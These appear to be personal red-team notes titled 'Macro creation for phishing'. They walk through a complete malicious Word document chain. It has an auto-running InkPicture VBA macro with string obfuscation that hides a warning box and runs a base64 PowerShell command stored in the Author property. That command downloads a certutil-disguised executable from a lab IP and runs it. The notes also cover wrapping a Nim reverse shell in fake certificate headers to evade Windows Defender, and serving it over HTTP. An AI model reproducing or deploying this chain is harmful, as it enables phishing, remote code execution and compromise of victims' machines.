# Macro creation for phishing
![2023-11-06 09_04_47-Performance and Salaries docm - Word](https://github.com/bilkoh/notes_from_underground/assets/43228593/760a4c20-8205-4f12-a86e-a8327ff5cec9)

# InkPicture Macro Route
https://gist.github.com/mgeeky/6097ea56e0f541aa7d98161e2aa76dfb
https://www.whiteoaksecurity.com/blog/alternative-execution-macro-saga-inkpicture-part-1/

## This is the macro
```VB
Public Once As Integer
Private Sub DeleteWarningShape(ByVal textBoxName As String, ByVal saveDocAfter As Boolean)
    Dim shape As Word.shape
    On Error Resume Next
    For Each shape In ActiveDocument.Shapes
        If StrComp(shape.Name, textBoxName) = 0 Then
            'shape.Delete
            shape.Visible = msoFalse
            Exit For
        End If
    Next
    If saveDocAfter Then
        ActiveDocument.Save
    End If
End Sub

Public Sub Launch()
    On Error Resume Next
    DeleteWarningShape "**warning-div**", False
    
    Dim authorProperty As String
    authorProperty = ActiveDocument.BuiltInDocumentProperties("Author")
    Set objWShell = CreateObject("WScr" & "ipt.S" & "hell")
    
    Dim encode As String
    enccode = authorProperty
    
    Dim str As String
    str = "powe" & "rsh" & "ell.exe -no" & "p -w" & "indowstyle hid" & "den -co" & "mmand " & """$decodedCommand = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\""" & enccode & "\"")); Invoke-Expression $decodedCommand"""
    
    objWShell.Exec (str)
End Sub

Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.InkRectangle)
    If Once < 1 Then
        Launch
    End If
    Once = Once + 1
End Sub
```

### Changing the author of the doc to string of powershell commands
What it looks like decoded
```PowerShell
powershell -ep bypass -Command "(new-object Net.WebClient).DownloadFile('http://192.168.56.102/encoded.crt','%TEMP%\encoded.crt');certutil -decode %TEMP%\encoded.crt %TEMP%\encoded.exe; %TEMP%\encoded.exe"
```
Convert it to base64
```PowerShell
powershell -ep bypass -command "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"(new-object Net.WebClient).DownloadFile('http://192.168.56.102/encoded.crt','%TEMP%\encoded.crt');certutil -decode %TEMP%\encoded.crt %TEMP%\encoded.exe; %TEMP%\encoded.exe\"))"
```

Output:
```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUANgAuADEAMAAyAC8AZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcAKQA7AGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGUAeABlADsAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBlAHgAZQA=
```

This output will be the base64 string we'll dump into author

Explaining how to decode and run:

`powershell.exe -nop -windowstyle hidden -Command calc.exe`

Tests with decoding and running encoded string:
```VB
powershell -ep bypass -command "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"calc.exe\"))"

YwBhAGwAYwAuAGUAeABlAA==

powershell -ep bypass -command "$decodedCommand = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"YwBhAGwAYwAuAGUAeABlAA==\")); Invoke-Expression $decodedCommand"

powershell -ep bypass -command "$decodedCommand = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"x\")); Invoke-Expression $decodedCommand"

"powershell -ep bypass -command ""$decodedCommand = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\""x\"")); Invoke-Expression $decodedCommand"""

```

## bypassing Windows Defender

### using nim reverse shell
https://github.com/Sn1r/Nim-Reverse-Shell

generated the binary `pkcatcherror.exe`

### need to encode it 
```bash
#!/bin/bash
OUTPUT_FILE=encoded.crt
PAYLOAD_FILE=pkcatcherror.exe

echo -----BEGIN CERTIFICATE----- > $OUTPUT_FILE
cat $PAYLOAD_FILE | base64 -w 0 >> $OUTPUT_FILE
echo -----END CERTIFICATE----- >> $OUTPUT_FILE

echo "Generated file: $OUTPUT_FILE"
```

#### execute it
```Bash
cat > gen_encoded_nim.sh
chmod +x gen_encoded_nim.sh
./gen_encoded_nim.sh
```
### set up http server to serve `encoded.crt`
```
sudo python3 -m http.server 80
```
